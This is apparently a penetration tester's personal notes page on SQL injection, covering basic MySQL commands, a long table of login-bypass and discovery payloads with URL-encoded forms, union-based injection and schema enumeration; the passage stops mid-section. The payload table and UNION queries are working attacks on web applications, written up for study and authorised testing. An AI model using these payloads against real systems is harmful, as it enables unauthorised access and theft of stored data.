<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/web-exploitation/SQL-injection</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/web-exploitation/SQL-injection"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/now/">now</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>SQL injection</h1>

<h2>basic SQL commands</h2>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># connect to database, mind the absence of space</span>
<span class="c"># between the -p flag and password:</span>
mysql <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span>&lt;password&gt; <span class="nt">-h</span> &lt;IP or domain name&gt; <span class="nt">-P</span> &lt;port&gt;
</code></pre></div><div class="highlight"><pre class="highlight sql"><code><span class="c1">-- basic SQL navigation commands:</span>
<span class="k">SHOW</span> <span class="n">databases</span><span class="p">;</span>
<span class="k">CREATE</span> <span class="k">DATABASE</span> <span class="n">users</span><span class="p">;</span>
<span class="n">USE</span> <span class="n">users</span><span class="p">;</span>
<span class="k">SHOW</span> <span class="n">tables</span><span class="p">;</span>
<span class="k">DESCRIBE</span> <span class="n">logins</span><span class="p">;</span>

<span class="c1">-- template for table creation,</span>
<span class="c1">-- with various types and properties:</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">logins</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">INT</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span>
    <span class="n">username</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="k">UNIQUE</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="n">password</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="n">date_of_joining</span> <span class="nb">DATETIME</span> <span class="k">DEFAULT</span> <span class="n">NOW</span><span class="p">(),</span>
    <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span>
<span class="p">);</span>

<span class="c1">-- add new records to specified table:</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">VALUES</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">column1</span> <span class="n">value</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">column2</span> <span class="n">value</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">column3</span> <span class="n">value</span><span class="o">&gt;</span><span class="p">,</span> <span class="p">...);</span>

<span class="c1">-- add new records and specify columns</span>
<span class="c1">-- to insert values, to avoid filling</span>
<span class="c1">-- columns with default values:</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&lt;</span><span class="k">column</span> <span class="mi">2</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">column</span> <span class="mi">3</span><span class="o">&gt;</span><span class="p">,</span> <span class="p">...)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">column2</span> <span class="n">value</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">column3</span> <span class="n">value</span><span class="o">&gt;</span><span class="p">,</span> <span class="p">...);</span>

<span class="c1">-- insert multiple records at once:</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">(</span><span class="o">&lt;</span><span class="k">column</span> <span class="mi">2</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">column</span> <span class="mi">3</span><span class="o">&gt;</span><span class="p">,</span> <span class="p">...)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">column2</span> <span class="n">value</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">column3</span> <span class="n">value</span><span class="o">&gt;</span><span class="p">,</span> <span class="p">...),</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">column2</span> <span class="n">value</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">column3</span> <span class="n">value</span><span class="o">&gt;</span><span class="p">,</span> <span class="p">...);</span>

<span class="c1">-- select entire table:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- select specific columns:</span>
<span class="k">SELECT</span> <span class="o">&lt;</span><span class="k">column</span> <span class="mi">1</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">column</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- remove entire table:</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- add new column to table;</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">ADD</span> <span class="o">&lt;</span><span class="k">new</span> <span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="k">column</span> <span class="k">type</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- rename a column:</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">RENAME</span> <span class="k">COLUMN</span> <span class="o">&lt;</span><span class="k">new</span> <span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">TO</span> <span class="o">&lt;</span><span class="k">old</span> <span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- change a column's data type:</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">MODIFY</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="k">new</span> <span class="k">type</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- delete a column:</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">DROP</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- modify record(s) in table matching a condition:</span>
<span class="k">UPDATE</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">SET</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span> <span class="o">=</span> <span class="s1">'&lt;new record value&gt;'</span> <span class="k">WHERE</span> <span class="o">&lt;</span><span class="n">condition</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- order selection by specified column:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- order selection by specified column in descending order:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">DESC</span><span class="p">;</span>

<span class="c1">-- order selection with multiple columns:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span> <span class="mi">1</span><span class="o">&gt;</span> <span class="k">DESC</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="k">ASC</span><span class="p">;</span>

<span class="c1">-- limit selection with only n number of records:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">LIMIT</span> <span class="o">&lt;</span><span class="n">number</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- limit selection with offset (beginning selection with n record, counting from zero):</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">LIMIT</span> <span class="o">&lt;</span><span class="k">offset</span> <span class="n">number</span><span class="o">&gt;</span><span class="p">,</span> <span class="o">&lt;</span><span class="k">limit</span> <span class="n">number</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- limit selection by record(s) matching string:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">WHERE</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span> <span class="o">=</span> <span class="s1">'&lt;string&gt;'</span><span class="p">;</span>

<span class="c1">-- limit selection by record(s) beginning with string:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">WHERE</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">LIKE</span> <span class="s1">'&lt;string&gt;%'</span><span class="p">;</span>

<span class="c1">-- limit selection by record(s) with only n characters:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">WHERE</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">LIKE</span> <span class="s1">'&lt;number of _underscores_ for characters&gt;'</span><span class="p">;</span>

<span class="c1">-- in mySQL, 0 is false, everything else is true.</span>
<span class="c1">-- AND, OR and NOT operators can also be represented with</span>
<span class="c1">-- &amp;&amp;, || and !:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">!=</span> <span class="s1">'eve'</span><span class="p">;</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">!=</span> <span class="s1">'eve'</span> <span class="k">AND</span> <span class="n">id</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">;</span>

<span class="c1">-- as with most languages, operator precedence can be</span>
<span class="c1">-- changed with parentheses:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">!=</span> <span class="s1">'eve'</span> <span class="k">AND</span> <span class="n">id</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">3</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">-- doesn't change anything but doesn't hurt either</span>
</code></pre></div>

<h2>SQL injection discovery</h2>

<p>we can use the following payloads to test if any form is vulnerable to SQL injection:</p>

<table><thead>
<tr>
<th>payload</th>
<th>URL-encoded</th>
</tr>
</thead><tbody>
<tr>
<td>&#39;</td>
<td>%27</td>
</tr>
<tr>
<td>&quot;</td>
<td>%22</td>
</tr>
<tr>
<td>#</td>
<td>%23</td>
</tr>
<tr>
<td>;</td>
<td>%3B</td>
</tr>
<tr>
<td>)</td>
<td>%29</td>
</tr>
<tr>
<td>&#39;-&#39;</td>
<td>%27-%27</td>
</tr>
<tr>
<td>&#39; &#39;</td>
<td>%27%20%27</td>
</tr>
<tr>
<td>&#39;&amp;&#39;</td>
<td>%27%26%27</td>
</tr>
<tr>
<td>&#39;^&#39;</td>
<td>%27%5E%27</td>
</tr>
<tr>
<td>&#39;*&#39;</td>
<td>%27%2A%27</td>
</tr>
<tr>
<td>&#39; or 1=1 limit 1 -- -+</td>
<td>%27%20or%201%3D1%20limit%201%20--%20-%2B</td>
</tr>
<tr>
<td>&#39;=&quot;or&#39;</td>
<td>%27%3D%22or%27</td>
</tr>
<tr>
<td>&#39; or &#39;&#39;-&#39;</td>
<td>%27%20or%20%27%27-%27</td>
</tr>
<tr>
<td>&#39; or &#39;&#39; &#39;</td>
<td>%27%20or%20%27%27%20%27</td>
</tr>
<tr>
<td>&#39; or &#39;&#39;&amp;&#39;</td>
<td>%27%20or%20%27%27%26%27</td>
</tr>
<tr>
<td>&#39; or &#39;&#39;^&#39;</td>
<td>%27%20or%20%27%27%5E%27</td>
</tr>
<tr>
<td>&#39; or &#39;&#39;*&#39;</td>
<td>%27%20or%20%27%27%2A%27</td>
</tr>
<tr>
<td>&#39;-&#124;&#124;0&#39;</td>
<td>%27-%7C%7C0%27</td>
</tr>
<tr>
<td>&quot;-&#124;&#124;0&quot;</td>
<td>%22-%7C%7C0%22</td>
</tr>
<tr>
<td>&quot;-&quot;</td>
<td>%22-%22</td>
</tr>
<tr>
<td>&quot; &quot;</td>
<td>%22%20%22</td>
</tr>
<tr>
<td>&quot;&amp;&quot;</td>
<td>%22%26%22</td>
</tr>
<tr>
<td>&quot;^&quot;</td>
<td>%22%5E%22</td>
</tr>
<tr>
<td>&quot;*&quot;</td>
<td>%22%2A%22</td>
</tr>
<tr>
<td>&#39;--&#39;</td>
<td>%27--%27</td>
</tr>
<tr>
<td>&quot;--&quot;</td>
<td>%22--%22</td>
</tr>
<tr>
<td>&#39;--&#39; / &quot;--&quot;</td>
<td>%27--%27%20%2F%20%22--%22</td>
</tr>
<tr>
<td>&quot; or &quot;&quot;-&quot;</td>
<td>%22%20or%20%22%22-%22</td>
</tr>
<tr>
<td>&quot; or &quot;&quot; &quot;</td>
<td>%22%20or%20%22%22%20%22</td>
</tr>
<tr>
<td>&quot; or &quot;&quot;&amp;&quot;</td>
<td>%22%20or%20%22%22%26%22</td>
</tr>
<tr>
<td>&quot; or &quot;&quot;^&quot;</td>
<td>%22%20or%20%22%22%5E%22</td>
</tr>
<tr>
<td>&quot; or &quot;&quot;*&quot;</td>
<td>%22%20or%20%22%22%2A%22</td>
</tr>
<tr>
<td>or true--</td>
<td>or%20true--</td>
</tr>
<tr>
<td>&quot; or true--</td>
<td>%22%20or%20true--</td>
</tr>
<tr>
<td>&#39; or true--</td>
<td>%27%20or%20true--</td>
</tr>
<tr>
<td>&quot;) or true--</td>
<td>%22%29%20or%20true--</td>
</tr>
<tr>
<td>&#39;) or true--</td>
<td>%27%29%20or%20true--</td>
</tr>
<tr>
<td>&#39; or &#39;x&#39;=&#39;x</td>
<td>%27%20or%20%27x%27%3D%27x</td>
</tr>
<tr>
<td>&#39;) or (&#39;x&#39;)=(&#39;x</td>
<td>%27%29%20or%20%28%27x%27%29%3D%28%27x</td>
</tr>
<tr>
<td>&#39;)) or ((&#39;x&#39;))=((&#39;x</td>
<td>%27%29%29%20or%20%28%28%27x%27%29%29%3D%28%28%27x</td>
</tr>
<tr>
<td>&quot; or &quot;x&quot;=&quot;x</td>
<td>%22%20or%20%22x%22%3D%22x</td>
</tr>
<tr>
<td>&quot;) or (&quot;x&quot;)=(&quot;x</td>
<td>%22%29%20or%20%28%22x%22%29%3D%28%22x</td>
</tr>
<tr>
<td>&quot;)) or ((&quot;x&quot;))=((&quot;x</td>
<td>%22%29%29%20or%20%28%28%22x%22%29%29%3D%28%28%22x</td>
</tr>
<tr>
<td>or 2 like 2</td>
<td>or%202%20like%202</td>
</tr>
<tr>
<td>or 1=1</td>
<td>or%201%3D1</td>
</tr>
<tr>
<td>or 1=1--</td>
<td>or%201%3D1--</td>
</tr>
<tr>
<td>or 1=1#</td>
<td>or%201%3D1%23</td>
</tr>
<tr>
<td>or 1=1/*</td>
<td>or%201%3D1%2F%2A</td>
</tr>
<tr>
<td>admin&#39; --</td>
<td>admin%27%20--</td>
</tr>
<tr>
<td>admin&#39; -- -</td>
<td>admin%27%20--%20-</td>
</tr>
<tr>
<td>admin&#39; #</td>
<td>admin%27%20%23</td>
</tr>
<tr>
<td>admin&#39;/*</td>
<td>admin%27%2F%2A</td>
</tr>
<tr>
<td>admin&#39; or &#39;2&#39; LIKE &#39;1</td>
<td>admin%27%20or%20%272%27%20LIKE%20%271</td>
</tr>
<tr>
<td>admin&#39; or 2 LIKE 2--</td>
<td>admin%27%20or%202%20LIKE%202--</td>
</tr>
<tr>
<td>admin&#39; or 2 LIKE 2#</td>
<td>admin%27%20or%202%20LIKE%202%23</td>
</tr>
<tr>
<td>admin&#39;) or 2 LIKE 2#</td>
<td>admin%27%29%20or%202%20LIKE%202%23</td>
</tr>
<tr>
<td>admin&#39;) or 2 LIKE 2--</td>
<td>admin%27%29%20or%202%20LIKE%202--</td>
</tr>
<tr>
<td>admin&#39;) or (&#39;2&#39; LIKE &#39;2</td>
<td>admin%27%29%20or%20%28%272%27%20LIKE%20%272</td>
</tr>
<tr>
<td>admin&#39;) or (&#39;2&#39; LIKE &#39;2&#39;#</td>
<td>admin%27%29%20or%20%28%272%27%20LIKE%20%272%27%23</td>
</tr>
<tr>
<td>admin&#39;) or (&#39;2&#39; LIKE &#39;2&#39;/*</td>
<td>admin%27%29%20or%20%28%272%27%20LIKE%20%272%27%2F%2A</td>
</tr>
<tr>
<td>admin&#39; or &#39;1&#39;=&#39;1</td>
<td>admin%27%20or%20%271%27%3D%271</td>
</tr>
<tr>
<td>admin&#39; or &#39;1&#39;=&#39;1&#39;--</td>
<td>admin%27%20or%20%271%27%3D%271%27--</td>
</tr>
<tr>
<td>admin&#39; or &#39;1&#39;=&#39;1&#39;#</td>
<td>admin%27%20or%20%271%27%3D%271%27%23</td>
</tr>
<tr>
<td>admin&#39; or &#39;1&#39;=&#39;1&#39;/*</td>
<td>admin%27%20or%20%271%27%3D%271%27%2F%2A</td>
</tr>
<tr>
<td>admin&#39;or 1=1 or &#39;&#39;=&#39;</td>
<td>admin%27or%201%3D1%20or%20%27%27%3D%27</td>
</tr>
<tr>
<td>admin&#39; or 1=1</td>
<td>admin%27%20or%201%3D1</td>
</tr>
<tr>
<td>admin&#39; or 1=1--</td>
<td>admin%27%20or%201%3D1--</td>
</tr>
<tr>
<td>admin&#39; or 1=1#</td>
<td>admin%27%20or%201%3D1%23</td>
</tr>
<tr>
<td>admin&#39; or 1=1/*</td>
<td>admin%27%20or%201%3D1%2F%2A</td>
</tr>
<tr>
<td>admin&#39;) or (&#39;1&#39;=&#39;1</td>
<td>admin%27%29%20or%20%28%271%27%3D%271</td>
</tr>
<tr>
<td>admin&#39;) or (&#39;1&#39;=&#39;1&#39;--</td>
<td>admin%27%29%20or%20%28%271%27%3D%271%27--</td>
</tr>
<tr>
<td>admin&#39;) or (&#39;1&#39;=&#39;1&#39;#</td>
<td>admin%27%29%20or%20%28%271%27%3D%271%27%23</td>
</tr>
<tr>
<td>admin&#39;) or (&#39;1&#39;=&#39;1&#39;/*</td>
<td>admin%27%29%20or%20%28%271%27%3D%271%27%2F%2A</td>
</tr>
<tr>
<td>admin&#39;) or &#39;1&#39;=&#39;1</td>
<td>admin%27%29%20or%20%271%27%3D%271</td>
</tr>
<tr>
<td>admin&#39;) or &#39;1&#39;=&#39;1&#39;--</td>
<td>admin%27%29%20or%20%271%27%3D%271%27--</td>
</tr>
<tr>
<td>admin&#39;) or &#39;1&#39;=&#39;1&#39;#</td>
<td>admin%27%29%20or%20%271%27%3D%271%27%23</td>
</tr>
<tr>
<td>admin&#39;) or &#39;1&#39;=&#39;1&#39;/*</td>
<td>admin%27%29%20or%20%271%27%3D%271%27%2F%2A</td>
</tr>
<tr>
<td>1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055</td>
<td>1234%20%27%20AND%201%3D0%20UNION%20ALL%20SELECT%20%27admin%27%2C%20%2781dc9bdb52d04dc20036dbd8313ed055</td>
</tr>
<tr>
<td>admin&quot; --</td>
<td>admin%22%20--</td>
</tr>
<tr>
<td>admin&#39;;-- azer</td>
<td>admin%27%3B--%20azer%20</td>
</tr>
<tr>
<td>admin&quot; #</td>
<td>admin%22%20%23</td>
</tr>
<tr>
<td>admin&quot;/*</td>
<td>admin%22%2F%2A</td>
</tr>
<tr>
<td>admin&quot; or &quot;1&quot;=&quot;1</td>
<td>admin%22%20or%20%221%22%3D%221</td>
</tr>
<tr>
<td>admin&quot; or &quot;1&quot;=&quot;1&quot;--</td>
<td>admin%22%20or%20%221%22%3D%221%22--</td>
</tr>
<tr>
<td>admin&quot; or &quot;1&quot;=&quot;1&quot;#</td>
<td>admin%22%20or%20%221%22%3D%221%22%23</td>
</tr>
<tr>
<td>admin&quot; or &quot;1&quot;=&quot;1&quot;/*</td>
<td>admin%22%20or%20%221%22%3D%221%22%2F%2A</td>
</tr>
<tr>
<td>admin&quot;or 1=1 or &quot;&quot;=&quot;</td>
<td>admin%22or%201%3D1%20or%20%22%22%3D%22</td>
</tr>
<tr>
<td>admin&quot; or 1=1</td>
<td>admin%22%20or%201%3D1</td>
</tr>
<tr>
<td>admin&quot; or 1=1--</td>
<td>admin%22%20or%201%3D1--</td>
</tr>
<tr>
<td>admin&quot; or 1=1#</td>
<td>admin%22%20or%201%3D1%23</td>
</tr>
<tr>
<td>admin&quot; or 1=1/*</td>
<td>admin%22%20or%201%3D1%2F%2A</td>
</tr>
<tr>
<td>admin&quot;) or (&quot;1&quot;=&quot;1</td>
<td>admin%22%29%20or%20%28%221%22%3D%221</td>
</tr>
<tr>
<td>admin&quot;) or (&quot;1&quot;=&quot;1&quot;--</td>
<td>admin%22%29%20or%20%28%221%22%3D%221%22--</td>
</tr>
<tr>
<td>admin&quot;) or (&quot;1&quot;=&quot;1&quot;#</td>
<td>admin%22%29%20or%20%28%221%22%3D%221%22%23</td>
</tr>
<tr>
<td>admin&quot;) or (&quot;1&quot;=&quot;1&quot;/*</td>
<td>admin%22%29%20or%20%28%221%22%3D%221%22%2F%2A</td>
</tr>
<tr>
<td>admin&quot;) or &quot;1&quot;=&quot;1</td>
<td>admin%22%29%20or%20%221%22%3D%221</td>
</tr>
<tr>
<td>admin&quot;) or &quot;1&quot;=&quot;1&quot;--</td>
<td>admin%22%29%20or%20%221%22%3D%221%22--</td>
</tr>
<tr>
<td>admin&quot;) or &quot;1&quot;=&quot;1&quot;#</td>
<td>admin%22%29%20or%20%221%22%3D%221%22%23</td>
</tr>
<tr>
<td>admin&quot;) or &quot;1&quot;=&quot;1&quot;/*</td>
<td>admin%22%29%20or%20%221%22%3D%221%22%2F%2A</td>
</tr>
<tr>
<td>1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055</td>
<td>1234%20%22%20AND%201%3D0%20UNION%20ALL%20SELECT%20%22admin%22%2C%20%2281dc9bdb52d04dc20036dbd8313ed055</td>
</tr>
</tbody></table>

<p>URL-encoded payloads are needed when using them directly in the site&#39;s URL for GET requests. remember that the <code>AND</code> operator is evaluated before the <code>OR</code> operator, so as long as one condition is <code>true</code> with an <code>OR</code> operator present, the entire query will end up evaluating as <code>true</code>.</p>

<h2>union-based injections</h2>

<p>the <code>UNION</code> clause can be used to combine multiple <code>SELECT</code> statements, but all selected tables must have the same number of columns:</p>

<div class="highlight"><pre class="highlight sql"><code><span class="c1">-- select everything from two different tables:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="mi">1</span><span class="o">&gt;</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">table</span> <span class="mi">2</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- even out the number of columns between two different</span>
<span class="c1">-- tables so we can run our UNION. 'NULL' is used as it</span>
<span class="c1">-- fits all data types:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="o">&lt;</span><span class="k">table</span> <span class="mi">1</span><span class="o">&gt;</span> <span class="k">where</span> <span class="o">&lt;</span><span class="n">condition</span><span class="o">&gt;</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">,</span> <span class="k">NULL</span> <span class="k">from</span> <span class="o">&lt;</span><span class="k">table</span> <span class="mi">2</span><span class="o">&gt;</span><span class="p">;</span>
</code></pre></div>

<p>once we find a field that seems vulnerable to SQL injection, we need to figure out the number of columns selected by the server to perform union-based injections. for this purpose, we can either:</p>

<ul>
<li>inject <code>ORDER BY &lt;number&gt;</code> clauses, incrementing the number until we get an error.</li>
<li>inject  <code>UNION select &lt;comma-separated NULLs&gt;</code> clauses, adding <code>NULL</code>s until we <em>stop</em> getting errors.</li>
</ul>

<p>using <code>UNION</code> is especially useful to ensure we will perform our SQL injection in a column actually shown on front-end, by using numbers instead of <code>NULL</code>s:</p>

<div class="highlight"><pre class="highlight sql"><code><span class="c1">-- use numbers for union:</span>
<span class="k">UNION</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="c1">-- </span>

<span class="c1">-- check that data can be fetched:</span>
<span class="k">UNION</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="c1">-- </span>
</code></pre></div>

<h2>database enumeration (mySQL)</h2>

<p>identifying which database type we&#39;re dealing with is the first enumeration step:</p>

<div class="highlight"><pre class="highlight sql"><code><span class="c1">-- confirm if we have a mySQL database.</span>
<span class="c1">-- those commands won't work with other</span>
<span class="c1">-- DBMS:</span>

<span class="c1">-- get mySQL version:</span>
<span class="k">SELECT</span> <span class="o">@@</span><span class="k">version</span><span class="p">;</span>

<span class="c1">-- if we only have numeric output:</span>
<span class="k">SELECT</span> <span class="n">POW</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>

<span class="c1">-- if we have no output at all:</span>
<span class="k">SELECT</span> <span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</code></pre></div>

<p>to get a proper list of databases, tables and columns, we need to leverage the <code>INFORMATION_SCHEMA</code> database, which holds metadata about current databases on server:</p>

<div class="highlight"><pre class="highlight sql"><code><span class="c1">-- get all database names on server:</span>
<span class="k">SELECT</span> <span class="k">schema_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span>

<span class="c1">-- get database name currently used by application:</span>
<span class="k">SELECT</span> <span class="k">database</span><span class="p">();</span>

<span class="c1">-- get all tables of specified database:</span>
<span class="k">SELECT</span> <span class="k">table_name</span><span class="p">,</span> <span class="n">table_schema</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_schema</span> <span class="o">=</span> <span class="s1">'&lt;database name&gt;'</span><span class="p">;</span>

<span class="c1">-- get all columns of specified table:</span>
